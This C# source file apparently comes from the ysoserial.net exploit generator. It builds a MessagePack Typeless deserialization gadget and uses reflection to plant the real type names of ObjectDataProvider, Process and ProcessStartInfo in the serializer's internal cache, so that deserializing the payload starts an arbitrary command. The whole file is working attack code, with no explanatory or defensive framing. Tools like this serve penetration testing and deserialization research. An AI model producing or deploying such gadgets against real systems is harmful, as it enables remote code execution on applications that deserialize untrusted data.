namespace ysoserial.Helpers
{
    using System;
    using System.Reflection;
    using System.Collections.Generic;

    using MessagePack;
    using MessagePack.Formatters;
    using MessagePack.Resolvers;

    using Helpers.SurrogateClasses;

    /// <summary>
    /// Helper methods for generating an ObjectDataProvider gadget with MessagePack (Typeless)
    /// </summary>
    internal static class MessagePackObjectDataProviderHelper
    {
        /// <summary>
        /// Creates a serialized ObjectDataProvider gadget that when deserialized will execute the specified command.
        /// </summary>
        /// <param name="pCmdFileName">The command filename.</param>
        /// <param name="pCmdArguments">The command arguments.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        /// <returns>The serialized byte array.</returns>
        internal static byte[] CreateObjectDataProviderGadget(string pCmdFileName, string pCmdArguments, bool pUseLz4)
        {
            SwapTypeCacheNames(
                new Dictionary<Type, string>
                {
                    {
                        typeof(ObjectDataProviderSurrogate),
                        "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
                    },
                    {
                        typeof(ProcessSurrogate),
                        "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                    },
                    {
                        typeof(ProcessStartInfoSurrogate),
                        "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                    }
                });

            var odpInstance = CreateObjectDataProviderSurrogateInstance(pCmdFileName, pCmdArguments);

            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            return MessagePackSerializer.Serialize(odpInstance, options);
        }

        /// <summary>
        /// Tests the deserialization of a serialized object.
        /// </summary>
        /// <param name="pSerializedData">The serialized data.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        internal static void Test(byte[] pSerializedData, bool pUseLz4)
        {
            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            MessagePackSerializer.Deserialize<object>(pSerializedData, options);
        }

        /// <summary>
        /// Utilizes reflection to add values to the internal FullTypeNameCache that MessagePack uses to acquire cached type names for serialization.
        /// This allows us to swap our surrogate ObjectDataProvider gadget type information with the real gadget AQNs when serialized.
        /// </summary>
        /// <param name="pNewTypeCacheEntries">
        /// The dictionary of type name cache entries to swap. 
        ///     Key = The type that the serializer has found.
        ///     Value = The real gadget type AQN string which we want to use instead of the surrogate type AQN.
        /// </param>
        private static void SwapTypeCacheNames(IDictionary<Type, string> pNewTypeCacheEntries)
        {
            FieldInfo typeNameCacheField = typeof(TypelessFormatter).GetField("FullTypeNameCache", BindingFlags.NonPublic | BindingFlags.Static);
            object typeNameCache = typeNameCacheField.GetValue(TypelessFormatter.Instance);

            MethodInfo method = typeNameCacheField.FieldType.GetMethod("TryAdd", new[] { typeof(Type), typeof(byte[]) });

            foreach (var typeSwap in pNewTypeCacheEntries)
            {
                method.Invoke(typeNameCache,
                    new object[]
                    {
                        typeSwap.Key,
                        System.Text.Encoding.UTF8.GetBytes(typeSwap.Value)
                    });
            }
        }

        /// <summary>
        /// Creates a populated surrogate ObjectDataProvider instance which matches the object graph of the real ObjectDataProvider gadget.
        /// </summary>
        /// <param name="pCmdFileName">The command filename.</param>
        /// <param name="pCmdArguments">The command arguments.</param>
        /// <returns>The full ObjectDataProvider surrogate object graph.</returns>
        private static object CreateObjectDataProviderSurrogateInstance(string pCmdFileName, string pCmdArguments)
        {
            return new ObjectDataProviderSurrogate
            {
                MethodName = "Start",
                ObjectInstance = new ProcessSurrogate
                {
                    StartInfo = new ProcessStartInfoSurrogate
                    {
                        FileName = pCmdFileName,
                        Arguments = pCmdArguments
                    }
                }
            };
        }
    }
}
